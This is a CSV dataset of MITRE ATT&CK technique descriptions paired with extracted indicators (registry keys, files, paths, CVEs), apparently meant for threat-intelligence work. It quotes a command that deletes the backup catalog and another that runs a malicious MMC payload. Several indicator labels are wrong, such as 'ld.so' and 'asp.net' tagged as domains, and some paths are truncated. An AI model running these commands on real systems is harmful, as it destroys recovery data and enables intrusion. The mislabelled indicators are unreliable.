tech_id,tech_name,text,section,ioc,ioc_value
T1547.005,Security Support Provider,"Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.   The SSP configuration is stored in two Registry keys:  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages  and  HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages . An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.   [1]",Description,registry-key,HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security
T1220,XSL Script Processing,"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.    [1]      Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to  Trusted Developer Utilities Proxy Execution , the Microsoft common line transformation utility binary (msxsl.exe)    [2]    can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.    [3]    Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.    [4]    Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.   [5]      Command-line examples:   [3]      [5]      Another variation of this technique, dubbed ""Squiblytwo"", involves using  Windows Management Instrumentation  to invoke JScript or VBScript within an XSL file.   [6]    This technique can also execute local/remote scripts and, similar to its  Regsvr32 / ""Squiblydoo"" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in  Windows Management Instrumentation  provided they utilize the /FORMAT switch.   [5]      Command-line examples:   [5]      [6]",Description,file,msxsl.exe
T1220,XSL Script Processing,"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.    [1]      Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to  Trusted Developer Utilities Proxy Execution , the Microsoft common line transformation utility binary (msxsl.exe)    [2]    can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.    [3]    Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.    [4]    Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.   [5]      Command-line examples:   [3]      [5]      Another variation of this technique, dubbed ""Squiblytwo"", involves using  Windows Management Instrumentation  to invoke JScript or VBScript within an XSL file.   [6]    This technique can also execute local/remote scripts and, similar to its  Regsvr32 / ""Squiblydoo"" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in  Windows Management Instrumentation  provided they utilize the /FORMAT switch.   [5]      Command-line examples:   [5]      [6]",Description,file,Msxsl.exe
T1220,XSL Script Processing,Cobalt Group  used msxsl.exe to bypass AppLocker and to invoke Jscript code from an XSL file.   [8],Procedure Examples,file,msxsl.exe
T1074,Data Staged,Kobalos  can write captured SSH connection credentials to a file under the  /var/run  directory with a  .pid  extension for exfiltration.   [4],Procedure Examples,path,/var/run  directory with a  .pid
T1014,Rootkit,Hildegard  has modified /etc/ld.so.preload to overwrite readdir() and readdir64().   [18],Procedure Examples,path,/etc/ld.so
T1014,Rootkit,Hildegard  has modified /etc/ld.so.preload to overwrite readdir() and readdir64().   [18],Procedure Examples,domain,ld.so
T1014,Rootkit,Rocke  has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.   [22],Procedure Examples,path,/etc/ld.so
T1014,Rootkit,Rocke  has modified /etc/ld.so.preload to hook libc functions in order to hide the installed dropper and mining software in process lists.   [22],Procedure Examples,domain,ld.so
T1014,Rootkit,"Winnti for Linux  has used a modified copy of the open-source userland rootkit Azazel, named libxselinux.so, to hide the malware's operations and network activity.   [30]",Procedure Examples,domain,libxselinux.so
T1218.014,MMC,"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.   [1]      [2]    MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.   [3]      For example,  mmc C:\Users\foo\admintools.msc /a  will open a custom, saved console msc file in author mode.   [1]    Another common example is  mmc gpedit.msc , which will open the Group Policy Editor application window.    Adversaries may use MMC commands to perform malicious tasks. For example,  mmc wbadmin.msc delete catalog -quiet  deletes the backup catalog on the system (i.e.  Inhibit System Recovery ) without prompts to the user (Note:  wbadmin.msc  may only be present by default on Windows Server operating systems).   [4]      [5]      Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a  Component Object Model  class object.   [6]    Then, adversaries may create custom consoles with the ""Link to Web Address"" snap-in that is linked to the malicious CLSID subkey.   [7]    Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command:  mmc.exe -Embedding C:\path\to\test.msc .   [8]",Description,path,C:\path\to\test.msc
T1218.014,MMC,"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.   [1]      [2]    MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.   [3]      For example,  mmc C:\Users\foo\admintools.msc /a  will open a custom, saved console msc file in author mode.   [1]    Another common example is  mmc gpedit.msc , which will open the Group Policy Editor application window.    Adversaries may use MMC commands to perform malicious tasks. For example,  mmc wbadmin.msc delete catalog -quiet  deletes the backup catalog on the system (i.e.  Inhibit System Recovery ) without prompts to the user (Note:  wbadmin.msc  may only be present by default on Windows Server operating systems).   [4]      [5]      Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a  Component Object Model  class object.   [6]    Then, adversaries may create custom consoles with the ""Link to Web Address"" snap-in that is linked to the malicious CLSID subkey.   [7]    Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command:  mmc.exe -Embedding C:\path\to\test.msc .   [8]",Description,path,C:\Users\foo\admintools.msc
T1218.014,MMC,"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.   [1]      [2]    MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.   [3]      For example,  mmc C:\Users\foo\admintools.msc /a  will open a custom, saved console msc file in author mode.   [1]    Another common example is  mmc gpedit.msc , which will open the Group Policy Editor application window.    Adversaries may use MMC commands to perform malicious tasks. For example,  mmc wbadmin.msc delete catalog -quiet  deletes the backup catalog on the system (i.e.  Inhibit System Recovery ) without prompts to the user (Note:  wbadmin.msc  may only be present by default on Windows Server operating systems).   [4]      [5]      Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a  Component Object Model  class object.   [6]    Then, adversaries may create custom consoles with the ""Link to Web Address"" snap-in that is linked to the malicious CLSID subkey.   [7]    Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command:  mmc.exe -Embedding C:\path\to\test.msc .   [8]",Description,file,mmc.exe
T1070.001,Clear Windows Event Logs,HermeticWiper  can overwrite the  C:\Windows\System32\winevt\Logs  file on a targeted system.   [15],Procedure Examples,path,C:\Windows\System32\winevt\Logs
T1587.001,Malware,"Cleaver  has created customized tools and payloads for functions including ARP poisoning, encryption, credential dumping, ASP.NET shells, web backdoors, process enumeration, WMI querying, HTTP and SMB communications, network interface sniffing, and keystroke logging.   [11]",Procedure Examples,domain,asp.net
T1587.001,Malware,Kimsuky  has developed its own unique malware such as MailFetch.py for use in operations.   [15]      [16],Procedure Examples,domain,mailfetch.py
T1190,Exploit Public-Facing Application,"APT28  has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites.   [8]      [9]",Procedure Examples,cve,CVE-2020-17144
T1190,Exploit Public-Facing Application,"APT28  has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites.   [8]      [9]",Procedure Examples,cve,CVE-2020-0688
T1190,Exploit Public-Facing Application,"APT29  has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access. They have also exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.   [10]      [11]      [12]",Procedure Examples,cve,CVE-2019-11510
T1190,Exploit Public-Facing Application,"APT29  has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access. They have also exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.   [10]      [11]      [12]",Procedure Examples,cve,CVE-2020-0688
T1190,Exploit Public-Facing Application,"APT29  has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access. They have also exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.   [10]      [11]      [12]",Procedure Examples,cve,CVE-2018-13379
T1190,Exploit Public-Facing Application,"APT29  has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access. They have also exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.   [10]      [11]      [12]",Procedure Examples,cve,CVE-2019-9670
T1190,Exploit Public-Facing Application,"APT29  has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access. They have also exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network.   [10]      [11]      [12]",Procedure Examples,cve,CVE-2019-19781
